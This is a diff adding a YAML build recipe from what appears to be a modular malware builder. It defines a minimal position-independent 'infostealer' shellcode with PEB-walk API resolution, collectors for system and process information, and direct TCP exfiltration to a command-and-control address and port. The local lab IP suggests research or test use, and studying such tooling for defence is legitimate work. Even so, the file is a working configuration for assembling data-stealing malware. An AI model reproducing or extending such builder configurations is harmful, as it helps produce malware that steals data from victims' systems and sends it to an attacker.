@@ -1,0 +1,17 @@
+name: infostealer_shellcode
+description: Minimal infostealer for shellcode extraction (PIC-compatible)
+format: c
+arch: arch/shellcode_entry
+api_resolve: api_resolve/peb_walk
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes_api
+
+exfil: exfil/tcp_direct
+
+evasion: []
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
